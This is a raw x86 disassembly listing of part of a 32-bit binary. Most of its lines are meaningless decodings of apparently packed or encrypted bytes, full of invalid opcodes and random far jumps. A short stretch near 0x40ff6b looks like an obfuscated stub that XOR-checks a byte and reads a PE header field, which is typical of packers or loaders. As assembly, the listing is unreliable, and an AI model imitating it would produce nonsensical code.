  40f94b:	or     DWORD PTR [esi-0x79],0x20
  40f94f:	dec    edx
  40f950:	add    ch,BYTE PTR [edi+eax*4-0x7]
  40f954:	adc    ah,BYTE PTR [ebp+eax*1+0x11]
  40f958:	jmp    FWORD PTR [ecx-0x70]
  40f95b:	ret    0x82bc
  40f95e:	sbb    ah,ch
  40f960:	retf   0x8fb5
  40f963:	inc    ecx
  40f965:	inc    edx
  40f966:	pop    ss
  40f967:	sti    
  40f968:	adc    ah,bl
  40f96a:	dec    edi
  40f96b:	jbe    0x40f933
  40f96d:	pop    esp
  40f96e:	add    DWORD PTR [ecx+0xb36584e],0x58
  40f975:	inc    esi
  40f976:	jb     0x40f92a
  40f978:	in     al,dx
  40f979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f97a:	xlat   BYTE PTR ds:[ebx]
  40f97b:	and    ebx,DWORD PTR ds:0x4ebf0b02
  40f981:	cmp    eax,0x27b00e0
  40f986:	or     BYTE PTR [ebx],ah
  40f988:	retf   0x8c9e
  40f98b:	and    eax,0x6349dc82
  40f990:	sbb    eax,0x18ca4aeb
  40f995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f996:	cli    
  40f997:	mov    al,0x9c
  40f999:	inc    ebx
  40f99a:	call   0x811b142b
  40f99f:	aaa    
  40f9a0:	push   esp
  40f9a1:	adc    ecx,DWORD PTR [edi]
  40f9a3:	sbb    eax,ebp
  40f9a5:	mov    eax,0x2a583020
  40f9aa:	mov    DWORD PTR ds:[edi-0x430d97fb],ebp
  40f9b1:	hlt    
  40f9b2:	sbb    BYTE PTR [edi+0x2e],dl
  40f9b5:	push   ds
  40f9b6:	ds xchg edi,eax
  40f9b8:	enter  0xc393,0x12
  40f9bc:	int3   
  40f9bd:	cmp    edx,DWORD PTR [eax+ebx*4]
  40f9c0:	ins    BYTE PTR es:[edi],dx
  40f9c1:	adc    DWORD PTR [ecx-0x719ae635],0x711764b4
  40f9cb:	test   DWORD PTR [eax],ecx
  40f9cd:	push   ss
  40f9ce:	mov    eax,0x53efa51
  40f9d3:	sbb    al,0x4c
  40f9d5:	(bad)  
  40f9d6:	xlat   BYTE PTR ds:[ebx]
  40f9d7:	dec    esi
  40f9d8:	ds xor al,dh
  40f9db:	(bad)  
  40f9dc:	cwde   
  40f9dd:	or     eax,0x36a486
  40f9e2:	jb     0x40f975
  40f9e4:	je     0x40f9e8
  40f9e6:	je     0x40fa46
  40f9e8:	mov    ebx,0x64af18c1
  40f9ed:	sbb    eax,0xbb575bfd
  40f9f2:	pop    ds
  40f9f3:	xchg   ebp,eax
  40f9f4:	cmc    
  40f9f5:	call   0xcb3b209
  40f9fa:	pop    esp
  40f9fb:	xchg   esi,eax
  40f9fc:	outs   dx,DWORD PTR ds:[esi]
  40f9fd:	div    eax
  40f9ff:	jmp    0x9af2:0xa17cd662
  40fa06:	xor    dl,BYTE PTR [edx-0x3a32bc26]
  40fa0c:	fldenv [ebx+0x5a1a8449]
  40fa12:	mov    edx,0x9ad735e3
  40fa17:	pushf  
  40fa18:	adc    ebx,esp
  40fa1a:	inc    edx
  40fa1b:	fcom   QWORD PTR [edx+0x5e158e25]
  40fa21:	jecxz  0x40f9ab
  40fa23:	(bad)  
  40fa24:	jnp    0x40fa5a
  40fa26:	icebp  
  40fa27:	push   0xffffffd6
  40fa29:	or     eax,0xa18bfb36
  40fa2e:	popf   
  40fa2f:	shr    DWORD PTR [ebp-0x22],cl
  40fa32:	pop    eax
  40fa33:	pop    edx
  40fa34:	mov    ah,0x99
  40fa36:	push   ds
  40fa37:	std    
  40fa38:	pop    edi
  40fa39:	stos   DWORD PTR es:[edi],eax
  40fa3a:	sub    eax,0x1c62b9c5
  40fa3f:	int3   
  40fa40:	sub    ecx,esp
  40fa42:	mov    edx,0xb2dd1521
  40fa47:	aas    
  40fa48:	imul   ebp,DWORD PTR [esi-0x6b772a1a],0x2a4346d7
  40fa52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa53:	mov    bl,0x5f
  40fa55:	js     0x40fa79
  40fa57:	hlt    
  40fa58:	and    DWORD PTR [edx],edi
  40fa5a:	pop    ecx
  40fa5b:	out    0x70,eax
  40fa5d:	mov    bl,0x36
  40fa5f:	xchg   DWORD PTR [edx+0x30],edx
  40fa62:	jg     0x40faae
  40fa64:	enter  0x2233,0x9
  40fa68:	push   eax
  40fa69:	add    DWORD PTR [edi-0x6687cea1],0x6427c63a
  40fa73:	into   
  40fa74:	lods   al,BYTE PTR ds:[esi]
  40fa75:	psadbw mm6,QWORD PTR [esi-0x23]
  40fa79:	bound  eax,QWORD PTR [edi-0x9]
  40fa7c:	mov    BYTE PTR [ecx-0x20],ah
  40fa7f:	mov    ah,0x9a
  40fa81:	adc    DWORD PTR [edx-0x180ed7d1],ebp
  40fa87:	push   eax
  40fa88:	sbb    eax,0xa586636e
  40fa8d:	fs mov dl,0x60
  40fa90:	jmp    0x755f:0xf0d5c0e
  40fa97:	out    0x69,eax
  40fa99:	push   edx
  40fa9a:	stc    
  40fa9b:	add    esp,0xffffff9d
  40fa9e:	repz push edx
  40faa0:	mov    ebx,0x1ac4b5dc
  40faa5:	stos   DWORD PTR es:[edi],eax
  40faa6:	ficomp WORD PTR [ebp+0x336c6cea]
  40faac:	icebp  
  40faad:	clc    
  40faae:	xor    BYTE PTR [edx],al
  40fab0:	mov    ah,0x85
  40fab2:	(bad)  
  40fab3:	jp     0x40fab8
  40fab5:	cmp    esp,0x521338bf
  40fabb:	pop    ds
  40fabc:	(bad)  
  40fabd:	jne    0x40fb31
  40fabf:	in     al,dx
  40fac0:	retf   0xbf8b
  40fac3:	fild   DWORD PTR [ebx]
  40fac5:	scas   al,BYTE PTR es:[edi]
  40fac6:	sbb    DWORD PTR fs:[esi-0x6f9a9e1a],0x7afb7323
  40fad1:	retf   
  40fad2:	rcr    BYTE PTR [eax],cl
  40fad4:	or     edi,DWORD PTR [ebx]
  40fad6:	and    al,0x6f
  40fad8:	cs jns 0x40fab6
  40fadb:	jge    0x40fa66
  40fadd:	cmp    eax,0xea8ed128
  40fae2:	add    bl,ch
  40fae4:	test   eax,0xf3a26b9b
  40fae9:	mov    bh,0x8a
  40faeb:	loope  0x40fa90
  40faed:	dec    esi
  40faee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faf0:	xchg   BYTE PTR [edi+0x39],bh
  40faf3:	mov    ebp,0xe96dc4d3
  40faf8:	inc    edi
  40faf9:	or     BYTE PTR [esi+eax*2],al
  40fafc:	and    al,ah
  40fafe:	sub    dl,BYTE PTR [esi-0x36]
  40fb01:	mov    al,ds:0x7b350ee1
  40fb06:	jle    0x40faf4
  40fb08:	pop    edx
  40fb09:	mov    ah,0xc8
  40fb0b:	fwait
  40fb0c:	scas   al,BYTE PTR es:[edi]
  40fb0d:	add    BYTE PTR [edx],0xa7
  40fb10:	ins    DWORD PTR es:[edi],dx
  40fb11:	xor    DWORD PTR [edx+0x43],esi
  40fb14:	fmul   DWORD PTR [ecx]
  40fb16:	pop    ebp
  40fb17:	cmc    
  40fb18:	popa   
  40fb19:	test   eax,0x2d86ec49
  40fb1e:	xor    ebx,esp
  40fb20:	pushf  
  40fb21:	or     edi,edx
  40fb23:	inc    eax
  40fb24:	sbb    ebx,esi
  40fb26:	inc    ebx
  40fb27:	ret    
  40fb28:	(bad)  
  40fb29:	sub    ecx,edi
  40fb2b:	cmc    
  40fb2c:	mov    ah,0xa4
  40fb2e:	data16 shr al,0x5e
  40fb32:	out    dx,eax
  40fb33:	dec    ebx
  40fb34:	mov    bp,WORD PTR [eax]
  40fb37:	adc    eax,DWORD PTR [ecx+0x43]
  40fb3a:	cs dec esi
  40fb3c:	outs   dx,DWORD PTR fs:[esi]
  40fb3e:	xchg   ebx,eax
  40fb3f:	pop    edx
  40fb40:	addr16 out dx,al
  40fb42:	std    
  40fb43:	pop    ebx
  40fb44:	xchg   edi,eax
  40fb45:	call   0xe932:0x6710171d
  40fb4c:	pushf  
  40fb4d:	mov    ebp,0x4fe5077
  40fb52:	int    0x4
  40fb54:	mov    ecx,0xbd52c9d6
  40fb59:	sub    ecx,DWORD PTR [eax-0xd93cbbc]
  40fb5f:	xor    cl,BYTE PTR [esi-0x76409f76]
  40fb65:	mov    ebp,0x7cbed34b
  40fb6a:	sbb    BYTE PTR [edx],0xa8
  40fb6d:	bound  esp,QWORD PTR [esi+eiz*8]
  40fb70:	pop    ebp
  40fb71:	xchg   edi,eax
  40fb72:	(bad)  
  40fb74:	pop    edx
  40fb75:	xchg   DWORD PTR [eax-0x76c736dd],edx
  40fb7b:	rol    BYTE PTR [eax],1
  40fb7d:	das    
  40fb7e:	adc    BYTE PTR [ecx+0x3ae260fd],dh
  40fb84:	xor    cl,dl
  40fb86:	dec    edx
  40fb87:	mov    al,0x48
  40fb89:	cwde   
  40fb8a:	mov    bh,0x36
  40fb8c:	dec    DWORD PTR [eax+0x13]
  40fb8f:	out    0xd3,al
  40fb91:	sub    BYTE PTR [ebp+0xddb3941],cl
  40fb97:	stc    
  40fb98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb99:	dec    ebp
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x8d
  40fbb3:	mov    cl,0x5d
  40fbb5:	dec    esi
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fbbf
  40fbbf:	jnp    0x40fbdc
  40fbc1:	xchg   edi,eax
  40fbc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc4:	xor    DWORD PTR [eax],ebx
  40fbc6:	sub    BYTE PTR ds:0xfe00c1da,dl
  40fbcc:	sar    DWORD PTR [eax],1
  40fbce:	cmp    BYTE PTR [edi+eax*8+0x6466562],0x8
  40fbd6:	pushf  
  40fbd7:	push   eax
  40fbd8:	test   eax,0xbf4d917b
  40fbdd:	push   edx
  40fbde:	cmp    bl,dl
  40fbe0:	(bad)  
  40fbe1:	and    eax,0x40391ec8
  40fbe6:	mov    esi,0x5b6c178c
  40fbeb:	fld    DWORD PTR cs:[esi-0x73aa6e78]
  40fbf2:	rcl    eax,1
  40fbf4:	and    BYTE PTR [eax+0x460f8fc5],cl
  40fbfa:	pop    edx
  40fbfb:	push   0xbede1cb3
  40fc00:	fdiv   DWORD PTR [eax-0x71]
  40fc03:	sbb    esp,DWORD PTR [edi+ebx*1]
  40fc06:	mov    edx,0xdbcdaea5
  40fc0b:	imul   eax,DWORD PTR [eax-0x17],0xffffffab
  40fc0f:	scas   al,BYTE PTR es:[edi]
  40fc10:	dec    edx
  40fc11:	push   0xda106a4
  40fc16:	mov    dl,0xaf
  40fc18:	mov    dl,0x27
  40fc1a:	and    ch,BYTE PTR [edi-0x6cb10e09]
  40fc20:	ins    DWORD PTR es:[edi],dx
  40fc21:	imul   ebx,ecx,0xcc6ba200
  40fc27:	dec    ebx
  40fc28:	push   es
  40fc29:	les    ebx,FWORD PTR [edi]
  40fc2b:	jmp    0x7fa9:0x1ca8cd87
  40fc32:	inc    edi
  40fc33:	(bad)  
  40fc34:	push   ebp
  40fc35:	in     eax,0x35
  40fc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc38:	lea    ebx,[eax-0x73b75ecb]
  40fc3e:	loope  0x40fc4a
  40fc40:	hlt    
  40fc41:	out    dx,al
  40fc42:	mov    eax,0x38c551c6
  40fc47:	ds mov cl,0xc3
  40fc4a:	loop   0x40fc3d
  40fc4c:	and    eax,0xd53bcf9f
  40fc51:	adc    eax,0x846d08a5
  40fc56:	and    esp,DWORD PTR [ecx]
  40fc58:	pop    ebx
  40fc59:	pusha  
  40fc5a:	ret    
  40fc5b:	sbb    BYTE PTR [eax+0x14e4ba0d],al
  40fc61:	and    ebp,ebp
  40fc63:	inc    ebp
  40fc64:	jno    0x40fbfa
  40fc66:	or     al,0x49
  40fc68:	xor    BYTE PTR [edx+0x4057fbf4],0x82
  40fc6f:	cwde   
  40fc70:	jbe    0x40fc76
  40fc72:	mov    dl,dl
  40fc74:	jp     0x40fc9b
  40fc76:	cwde   
  40fc77:	cmc    
  40fc78:	pop    edx
  40fc79:	xchg   DWORD PTR [ecx-0x5593b64d],edi
  40fc7f:	(bad)  
  40fc80:	rcr    BYTE PTR [edi+0x3a],0x89
  40fc84:	add    edx,DWORD PTR [ecx]
  40fc86:	push   cs
  40fc87:	mov    ds:0x1e6ec77e,eax
  40fc8c:	jmp    0x40fce0
  40fc8e:	sbb    cl,BYTE PTR [eax+0x399fbf22]
  40fc94:	(bad)  
  40fc95:	in     eax,0x61
  40fc97:	mov    bl,0xcd
  40fc99:	cmp    DWORD PTR [edi+0x58b00ed8],esi
  40fc9f:	addr16 aas 
  40fca1:	rcl    al,cl
  40fca3:	xchg   ebx,eax
  40fca4:	(bad)  
  40fca5:	in     al,0xd0
  40fca7:	cmc    
  40fca8:	adc    esp,DWORD PTR [ecx-0x39cdf8c2]
  40fcae:	leave  
  40fcaf:	ja     0x40fcab
  40fcb1:	dec    eax
  40fcb2:	sbb    al,0x74
  40fcb4:	sbb    DWORD PTR [ecx-0x103ed158],0x1c
  40fcbb:	and    eax,0xd56c755e
  40fcc0:	cmp    eax,0x7428caf4
  40fcc5:	shl    BYTE PTR [esi],1
  40fcc7:	into   
  40fcc8:	(bad)  [edx]
  40fcca:	pop    ss
  40fccb:	out    dx,eax
  40fccc:	mov    ?,WORD PTR [ebp+0x5a]
  40fccf:	push   ecx
  40fcd0:	shl    DWORD PTR [esi],cl
  40fcd2:	xor    ch,BYTE PTR [eax]
  40fcd4:	xor    DWORD PTR [esi+0x26],0xd
  40fcd8:	fild   DWORD PTR [ebp+0x53e72f3f]
  40fcde:	je     0x40fcda
  40fce0:	mov    ebx,0x22ad9332
  40fce5:	ror    dh,1
  40fce7:	imul   edi,DWORD PTR [esi+ebp*4+0x42],0xffffffee
  40fcec:	mov    al,0x7a
  40fcee:	jnp    0x40fce0
  40fcf0:	gs popa 
  40fcf2:	adc    al,0xc0
  40fcf4:	stc    
  40fcf5:	(bad)  
  40fcf6:	jmp    0x34cf05c9
  40fcfb:	mov    ebx,?
  40fcfd:	sub    dl,BYTE PTR ds:0x6928e68e
  40fd03:	mov    edx,0x3ccf88b6
  40fd08:	fcom   st(5)
  40fd0a:	inc    ecx
  40fd0b:	call   0xb940cfcb
  40fd10:	call   0xc76d:0xf6a3c6e2
  40fd17:	test   eax,0xcc4f0429
  40fd1c:	and    al,dh
  40fd1e:	pop    esp
  40fd1f:	sbb    dl,0x1c
  40fd22:	ins    DWORD PTR es:[edi],dx
  40fd23:	mov    esi,0xe8a642d
  40fd28:	adc    edx,ebp
  40fd2a:	xchg   esp,eax
  40fd2b:	adc    eax,0xf41eef40
  40fd30:	push   esp
  40fd31:	ret    0x609b
  40fd34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd35:	aad    0x50
  40fd37:	jno    0x40fdb1
  40fd39:	mov    ebx,0xd3cbccd0
  40fd3e:	ins    BYTE PTR es:[edi],dx
  40fd3f:	mov    ebx,0xf8fbbfda
  40fd44:	pop    edi
  40fd45:	outs   dx,BYTE PTR ds:[esi]
  40fd46:	xchg   BYTE PTR [edi-0x5a],al
  40fd49:	repz sbb BYTE PTR [ecx],0xec
  40fd4d:	push   ecx
  40fd4e:	pop    edx
  40fd4f:	pop    edx
  40fd50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd51:	push   ebx
  40fd52:	pop    ebx
  40fd53:	add    DWORD PTR [esi],ecx
  40fd55:	mov    al,ds:0xbe6afb3f
  40fd5a:	mov    ds:0x85462fc2,eax
  40fd5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd60:	sti    
  40fd61:	push   DWORD PTR [ecx]
  40fd63:	gs mov bl,0xe2
  40fd66:	mov    BYTE PTR [esi+eax*8+0x1cc43515],bh
  40fd6d:	xchg   esi,eax
  40fd6e:	out    dx,eax
  40fd6f:	std    
  40fd70:	stos   DWORD PTR es:[edi],eax
  40fd71:	jmp    0x40fdde
  40fd73:	add    eax,0xb37550c5
  40fd78:	xlat   BYTE PTR ds:[ebx]
  40fd79:	imul   BYTE PTR [esi+0x75]
  40fd7c:	call   DWORD PTR [edx-0x5]
  40fd7f:	xchg   ebx,eax
  40fd80:	sbb    esi,DWORD PTR [eax-0x21]
  40fd83:	mov    eax,0x20f7dd6b
  40fd88:	pop    es
  40fd89:	and    eax,edi
  40fd8b:	xor    edi,DWORD PTR [edi]
  40fd8d:	out    0xe4,eax
  40fd8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd90:	jb     0x40fd1d
  40fd92:	jns    0x40fde7
  40fd94:	mov    ecx,0x8150ec91
  40fd99:	dec    edi
  40fd9a:	mov    eax,0x30709328
  40fd9f:	sti    
  40fda0:	cmp    DWORD PTR [eax],ecx
  40fda2:	in     al,dx
  40fda3:	(bad)  
  40fda4:	xchg   ecx,eax
  40fda5:	xor    esp,edx
  40fda7:	pop    ebp
  40fda8:	and    al,0x90
  40fdaa:	outs   dx,BYTE PTR ds:[esi]
  40fdab:	js     0x40fd87
  40fdad:	push   esp
  40fdae:	ins    DWORD PTR es:[edi],dx
  40fdaf:	in     al,dx
  40fdb0:	mov    ds:0x8a4e4e92,al
  40fdb5:	mov    ebx,0x6cda2de1
  40fdba:	cmp    DWORD PTR [ecx-0x76],eax
  40fdbd:	dec    ebp
  40fdbe:	mov    ch,0x3c
  40fdc0:	adc    ebx,ebp
  40fdc2:	mov    ebx,0xd84fece1
  40fdc7:	jne    0x40fda0
  40fdc9:	call   0xfaee:0xa3ecaf4
  40fdd0:	cmp    al,0x56
  40fdd2:	mov    bl,0xeb
  40fdd4:	sbb    BYTE PTR [edx-0xe2afc10],ch
  40fdda:	jb     0x40fdf6
  40fddc:	jmp    0x683b:0xa603f6f4
  40fde3:	or     al,BYTE PTR [esi]
  40fde5:	sub    dl,BYTE PTR [ecx-0x5f]
  40fde8:	sub    ebx,ebx
  40fdea:	imul   eax,DWORD PTR [ebx+0x5ab5155d],0xffffffa6
  40fdf1:	mov    dl,0x3b
  40fdf3:	xchg   edi,eax
  40fdf4:	leave  
  40fdf5:	pop    es
  40fdf6:	fidivr WORD PTR [ebx+0xe]
  40fdf9:	adc    cl,0x75
  40fdfc:	adc    eax,0xb7242433
  40fe02:	dec    ebx
  40fe03:	inc    eax
  40fe04:	dec    esi
  40fe05:	out    0x37,eax
  40fe07:	fscale 
  40fe09:	fmul   DWORD PTR [esi]
  40fe0b:	loopne 0x40fdf7
  40fe0d:	iret   
  40fe0e:	mov    ds:0xc2bc2f53,al
  40fe13:	and    BYTE PTR [edx+0x5353c04],ah
  40fe19:	mov    DWORD PTR [edx-0x32],eax
  40fe1c:	mov    al,0xb3
  40fe1e:	rcl    al,cl
  40fe20:	sar    ebp,0x5f
  40fe23:	bound  ebx,QWORD PTR [ecx-0x514ccabb]
  40fe29:	inc    edi
  40fe2a:	mov    edx,0x7df2e9bb
  40fe2f:	mov    edx,0xccf06ef8
  40fe34:	adc    al,BYTE PTR fs:[ecx+0xf789972]
  40fe3b:	fld    st(4)
  40fe3d:	and    esp,DWORD PTR [eax]
  40fe3f:	sbb    BYTE PTR [ebx-0x5ff797d6],dh
  40fe45:	jne    0x40fe7d
  40fe47:	fsub   QWORD PTR [eax+eax*8-0x3ace0aaa]
  40fe4e:	sbb    ecx,esp
  40fe50:	ja     0x40fe91
  40fe52:	pop    eax
  40fe53:	push   esi
  40fe54:	repz aam 0xbe
  40fe57:	dec    eax
  40fe58:	out    0xdc,al
  40fe5a:	nop
  40fe5b:	mov    ds:0xb624039,eax
  40fe60:	in     al,0x66
  40fe62:	jbe    0x40fe20
  40fe64:	pop    edi
  40fe65:	je     0x40fe52
  40fe67:	sub    DWORD PTR [esi-0x633ed632],esp
  40fe6d:	lahf   
  40fe6e:	cwde   
  40fe6f:	loopne 0x40fe08
  40fe71:	dec    edx
  40fe72:	inc    edx
  40fe73:	mov    ah,0xcd
  40fe75:	sub    ebx,DWORD PTR [edi-0x7b]
  40fe78:	out    dx,eax
  40fe79:	sbb    al,BYTE PTR [esi]
  40fe7b:	push   ds
  40fe7c:	mov    ?,WORD PTR [esi+0x63]
  40fe7f:	pop    ebp
  40fe80:	mov    ds:0x9abd86,eax
  40fe85:	adc    DWORD PTR [ecx+ecx*4-0x19],eax
  40fe89:	ja     0x40feaa
  40fe8b:	sbb    eax,DWORD PTR [edx-0x35ca858]
  40fe91:	mov    ah,0x4c
  40fe93:	out    dx,al
  40fe94:	imul   esp,DWORD PTR [ebx+edi*2+0xb],0x1b
  40fe99:	fnsave [ebp-0x1f9d9980]
  40fe9f:	jmp    0x40fed8
  40fea1:	mov    ch,0x3c
  40fea3:	ss mov ch,0xd7
  40fea6:	in     eax,dx
  40fea7:	sbb    ebp,DWORD PTR [ebx+0x4c7f00a8]
  40fead:	loop   0x40fe3f
  40feaf:	ficomp WORD PTR [ebx-0x34]
  40feb2:	out    0xa3,al
  40feb4:	xchg   DWORD PTR [eax-0x4b1febda],ebx
  40feba:	retf   
  40febb:	pop    esp
  40febc:	stos   DWORD PTR es:[edi],eax
  40febd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40febe:	cmp    dl,ch
  40fec0:	jne    0x40fed2
  40fec2:	pop    ebp
  40fec3:	ret    
  40fec4:	ss iret 
  40fec6:	dec    ecx
  40fec7:	push   cs
  40fec8:	cmp    DWORD PTR [ebx-0x6346b2a9],edx
  40fece:	stos   DWORD PTR es:[edi],eax
  40fecf:	enter  0xc9d4,0x42
  40fed3:	or     DWORD PTR [edx+eiz*8+0x4e],0x22
  40fed8:	arpl   WORD PTR [ecx-0x6b],bp
  40fedb:	and    al,BYTE PTR [ebx]
  40fedd:	or     BYTE PTR [esi-0x1e0aeeb1],ah
  40fee3:	imul   eax,eax,0x42dac11f
  40fee9:	xchg   BYTE PTR [ebx-0x37],ch
  40feec:	out    0x7f,al
  40feee:	xchg   ecx,eax
  40feef:	mov    ebp,0x4a3d954b
  40fef4:	mov    bh,0x6c
  40fef6:	ficomp DWORD PTR [ecx+0x70839b32]
  40fefc:	(bad)  
  40fefd:	(bad)  [esi+0x5aa9f705]
  40ff03:	adc    al,0xa2
  40ff05:	icebp  
  40ff06:	dec    edx
  40ff07:	xchg   ebp,eax
  40ff08:	add    BYTE PTR [esi],ah
  40ff0a:	(bad)  
  40ff0b:	mov    eax,ds:0x6ba66368
  40ff10:	enter  0x2e14,0x30
  40ff14:	push   dx
  40ff16:	nop/reserved BYTE PTR [eax-0x65]
  40ff1a:	push   ebp
  40ff1b:	aas    
  40ff1c:	adc    eax,0x5aa0db7c
  40ff21:	sbb    al,0x76
  40ff23:	sbb    al,0x2e
  40ff25:	ins    DWORD PTR es:[edi],dx
  40ff26:	inc    ebp
  40ff27:	push   esp
  40ff28:	jmp    0x98c93dec
  40ff2d:	mov    DWORD PTR [ecx+0x5b187b04],eax
  40ff33:	iret   
  40ff34:	pop    esp
  40ff35:	jle    0x40ff2a
  40ff37:	xor    eax,0x64de6632
  40ff3c:	aas    
  40ff3d:	imul   edx,DWORD PTR [ecx-0x666b563d],0xeed44315
  40ff47:	jo     0x40fef2
  40ff49:	clc    
  40ff4a:	add    eax,0xc729e34d
  40ff4f:	in     eax,dx
  40ff50:	xor    BYTE PTR [ebx-0x2bdd94a2],cl
  40ff56:	aam    0xbd
  40ff58:	mov    ebx,DWORD PTR [eax]
  40ff5a:	inc    BYTE PTR [ebp+0x7461235d]
  40ff60:	pop    ds
  40ff61:	daa    
  40ff62:	es mov bh,0x5
  40ff65:	fmul   st,st(5)
  40ff67:	mov    ah,0xf7
  40ff69:	jno    0x40feff
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	jge    0x410016
  40ffde:	(bad)  
  40ffdf:	xlat   BYTE PTR ds:[ebx]
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x410051
  40ffe9:	xchg   ebx,eax
  40ffea:	jg     0x40fff4
  40ffec:	or     DWORD PTR [edi-0x7f],ecx
  40ffef:	cli    
  40fff0:	sub    DWORD PTR [eax],ecx
  40fff2:	bound  ecx,QWORD PTR [esi]
  40fff4:	xchg   edi,eax
  40fff5:	js     0x410017
  40fff7:	pop    ss
  40fff8:	mov    al,ds:0x62094fd1
  40fffd:	dec    ebx
  40fffe:	jnp    0x410026
  410000:	push   0x9ad4f750
  410005:	add    dl,BYTE PTR [ebp-0x335f3be5]
  41000b:	icebp  
  41000c:	rcl    ebp,1
  41000e:	cmp    BYTE PTR [ecx],bh
  410010:	mov    al,0xab
  410012:	std    
  410013:	add    DWORD PTR [ebx+0x15194b10],esp
  410019:	jge    0x40ffcd
  41001b:	and    ch,dh
  41001d:	pop    edx
  41001e:	in     al,0x1a
  410020:	cmp    BYTE PTR [eax+0x671d823c],0x83
  410027:	xor    ebx,ecx
  410029:	xor    eax,esi
  41002b:	dec    esp
  41002c:	add    eax,DWORD PTR [ebp-0x1a]
  41002f:	dec    DWORD PTR [ebp-0x3]
  410032:	mov    ebp,0x2f15a49e
  410037:	shr    DWORD PTR ds:0xbcbe7852,cl
  41003d:	aas    
  41003e:	jne    0x41004b
  410040:	sub    cl,BYTE PTR [ecx-0x73]
  410043:	aad    0x8d
  410045:	mov    WORD PTR [ecx+edi*1+0x72],es
  410049:	icebp  
  41004a:	push   ebp
  41004b:	mov    ch,0x8f
  41004d:	call   0xb363:0xbd57e9d6
  410054:	and    BYTE PTR [edi+0x6553bca1],ch
  41005a:	cmp    eax,0xba74f313
  41005f:	inc    eax
  410060:	cmp    DWORD PTR [esi],0xa
  410063:	cli    
  410064:	pop    ds
  410065:	pop    ebp
  410066:	loop   0x410092
  410068:	and    esi,DWORD PTR [ebp+0x18ca45d1]
  41006e:	jb     0x410041
  410070:	mov    bl,0xfb
  410072:	std    
  410073:	ss aad 0xaf
  410076:	jae    0x4100ab
  410078:	jl     0x410036
  41007a:	cmp    eax,0xcc4a03d0
  41007f:	sub    BYTE PTR [esi-0x21],al
  410082:	push   ebp
  410083:	cld    
  410084:	das    
  410085:	or     al,0xb2
  410087:	add    BYTE PTR [ebp+0xf3486b3],0x78
  41008e:	mov    dh,0xc4
  410090:	and    DWORD PTR [ebx+0x72],ecx
  410093:	xor    BYTE PTR [ebx-0x5a],bh
  410096:	aaa    
  410097:	cmp    BYTE PTR [ebx],ah
  410099:	aas    
  41009a:	bound  eax,QWORD PTR [ebp-0x2a]
  41009d:	mov    ds:0x4a7a7fcf,al
  4100a2:	cmp    eax,0xe9c3834c
  4100a7:	mov    bl,0x26
  4100a9:	jge    0x410080
  4100ab:	sub    bl,BYTE PTR [eax-0x7c]
  4100ae:	push   ss
  4100af:	and    DWORD PTR [edi+0x48e08d2b],ebp
  4100b5:	mov    ah,0x3e
  4100b7:	test   eax,ebx
  4100b9:	or     al,0xe5
  4100bb:	sub    bh,BYTE PTR [ebx-0x8d99c63]
  4100c1:	mul    BYTE PTR [eax+0x2d]
  4100c4:	aas    
  4100c5:	mov    ebp,0xfc0f71cb
  4100ca:	in     al,0xaa
  4100cc:	in     eax,0x68
  4100ce:	into   
  4100cf:	pop    esp
  4100d0:	xchg   esp,eax
  4100d1:	and    BYTE PTR [ebx+0x166b6b01],al
  4100d7:	out    0x36,al
  4100d9:	add    ebp,DWORD PTR [ebp+0x75]
  4100dc:	mov    ebx,0x228998f7
  4100e1:	fdiv   DWORD PTR [ebx-0x80]
  4100e4:	mov    ds:0x99021e1f,eax
  4100e9:	jae    0x4100a8
  4100eb:	mov    ebp,0x15d26d97
  4100f0:	mov    edx,0xdcb7a354
  4100f5:	ret    
  4100f6:	dec    eax
  4100f7:	add    dh,BYTE PTR [edi-0x73]
  4100fa:	lods   eax,DWORD PTR ds:[esi]
  4100fb:	pop    eax
  4100fc:	cmp    al,0x90
  4100fe:	(bad)  
  4100ff:	out    dx,eax
  410100:	ins    DWORD PTR es:[edi],dx
  410101:	div    al
  410103:	mov    ecx,0x2166836b
  410108:	jbe    0x4100a3
  41010a:	aad    0xbb
  41010c:	ret    
  41010d:	mov    dh,0x7a
